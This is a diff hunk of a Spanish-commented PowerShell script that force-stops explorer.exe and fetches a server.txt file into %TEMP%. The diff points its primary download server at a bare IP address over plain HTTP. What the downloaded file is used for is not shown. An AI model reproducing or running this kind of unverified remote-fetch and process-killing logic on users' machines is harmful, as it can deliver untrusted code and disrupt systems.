@@ -102,7 +102,7 @@ Write-Output "5% Completado"
 Stop-Process -Name "explorer" -Force
 ######################  Verificado Servers de Script ######################
 # Define las URLs de los servidores y la ruta de destino
-$primaryServer = "https://syasoporteglobal.online/files/server.txt"
+$primaryServer = "http://181.57.227.194/files/server.txt"
 $secondaryServer = "http://181.57.227.194/files/server.txt"
 $destinationPath1 = "$env:TEMP\server.txt"
 
